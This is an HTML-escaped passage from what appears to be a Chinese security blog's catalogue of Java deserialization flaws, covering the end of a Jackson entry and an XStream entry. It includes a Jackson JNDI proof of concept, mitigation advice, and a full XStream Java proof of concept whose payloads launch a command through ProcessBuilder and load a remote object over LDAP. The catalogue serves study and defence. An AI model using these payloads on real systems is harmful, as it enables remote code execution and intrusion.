    &gt;https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考&lt;/p&gt;
&lt;p&gt;Jackson-databind-2670远程代码执行漏洞简单分析 – 先知社区
&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/7506&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/7506&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;learnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug
&lt;a class=&#34;link&#34; href=&#34;https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;POC&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[&amp;quot;ch.qos.logback.core.db.JNDIConnectionSource&amp;quot;, {&amp;quot;jndiLocation&amp;quot;:&amp;quot;ldap://localhost:43658/Calc&amp;quot;}]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8. 防护方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)&lt;/p&gt;
&lt;p&gt;2.确保enableDefaultTyping是关闭的&lt;/p&gt;
&lt;p&gt;3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上&lt;/p&gt;
&lt;h2 id=&#34;xstream-反序列化漏洞&#34;&gt;Xstream 反序列化漏洞&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;1. 漏洞简介&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Xstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 影响组件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Xstream &amp;lt;1.4.6, =1.4.10&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 漏洞指纹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;xml&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Fofa Dork&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XStream反序列化组件攻击分析 | angelwhu_blog
&lt;a class=&#34;link&#34; href=&#34;https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins%EF%BF%A5%EF%BE%88%EF%BE%A9%EF%BF%A7%EF%BE%94%EF%BE%A8&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;89
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import com.thoughtworks.xstream.XStream;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import java.io.IOException;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class Main {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// POC1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public static void main(String[] args) throws IOException {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            XStream xStream = new XStream();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            String payload = &amp;#34;&amp;lt;sorted-set&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;    &amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;    &amp;lt;dynamic-proxy&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;    &amp;lt;interface&amp;gt;java.lang.Comparable&amp;lt;/interface&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;        &amp;lt;handler class=\&amp;#34;java.beans.EventHandler\&amp;#34;&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;            &amp;lt;target class=\&amp;#34;java.lang.ProcessBuilder\&amp;#34;&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;                &amp;lt;command&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;                    &amp;lt;string&amp;gt;cmd.exe&amp;lt;/string&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;                    &amp;lt;string&amp;gt;/c&amp;lt;/string&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;                    &amp;lt;string&amp;gt;calc&amp;lt;/string&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;                &amp;lt;/command&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;            &amp;lt;/target&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;     &amp;lt;action&amp;gt;start&amp;lt;/action&amp;gt;&amp;#34;+
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;        &amp;lt;/handler&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;    &amp;lt;/dynamic-proxy&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &amp;#34;&amp;lt;/sorted-set&amp;gt;\n&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//POC2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//        String payload = &amp;#34;&amp;lt;java.util.PriorityQueue serialization=\&amp;#34;custom\&amp;#34;&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;  &amp;lt;unserializable-parents/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;  &amp;lt;java.util.PriorityQueue&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;size&amp;gt;2&amp;lt;/size&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;comparator class=\&amp;#34;org.apache.commons.beanutils.BeanComparator\&amp;#34;&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;property&amp;gt;databaseMetaData&amp;lt;/property&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;comparator class=\&amp;#34;java.util.Collections$ReverseComparator\&amp;#34;/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;/comparator&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;/default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;int&amp;gt;3&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;com.sun.rowset.JdbcRowSetImpl serialization=\&amp;#34;custom\&amp;#34;&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;javax.sql.rowset.BaseRowSet&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;concurrency&amp;gt;1008&amp;lt;/concurrency&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;escapeProcessing&amp;gt;true&amp;lt;/escapeProcessing&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;fetchDir&amp;gt;1000&amp;lt;/fetchDir&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;fetchSize&amp;gt;0&amp;lt;/fetchSize&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;isolation&amp;gt;2&amp;lt;/isolation&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;maxFieldSize&amp;gt;0&amp;lt;/maxFieldSize&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;maxRows&amp;gt;0&amp;lt;/maxRows&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;queryTimeout&amp;gt;0&amp;lt;/queryTimeout&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;readOnly&amp;gt;true&amp;lt;/readOnly&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;rowSetType&amp;gt;1004&amp;lt;/rowSetType&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;showDeleted&amp;gt;false&amp;lt;/showDeleted&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;dataSource&amp;gt;ldap://ip:1389/Object&amp;lt;/dataSource&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;params/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;/default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;/javax.sql.rowset.BaseRowSet&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;com.sun.rowset.JdbcRowSetImpl&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;iMatchColumns&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;int&amp;gt;-1&amp;lt;/int&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;/iMatchColumns&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;strMatchColumns&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;            &amp;lt;null/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;          &amp;lt;/strMatchColumns&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;        &amp;lt;/default&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;      &amp;lt;/com.sun.rowset.JdbcRowSetImpl&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;/com.sun.rowset.JdbcRowSetImpl&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;    &amp;lt;com.sun.rowset.JdbcRowSetImpl reference=\&amp;#34;../com.sun.rowset.JdbcRowSetImpl\&amp;#34;/&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;  &amp;lt;/java.util.PriorityQueue&amp;gt;\n&amp;#34; +
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//                &amp;#34;&amp;lt;/java.util.PriorityQueue&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        xStream.fromXML(payload);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;7. 利用技巧&lt;/strong&gt;&lt;/p&gt;
